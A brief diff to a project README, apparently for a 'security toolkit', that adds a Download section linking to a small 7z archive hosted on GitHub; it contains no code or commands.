@@ -2,6 +2,10 @@
 
 Security toolkit for your computer.
 
+## Download
+
+[phi.7z](https://github.com/prism-iq/ieud/raw/main/phi.7z) (28 KB)
+
 ## Install
 
 **Linux**
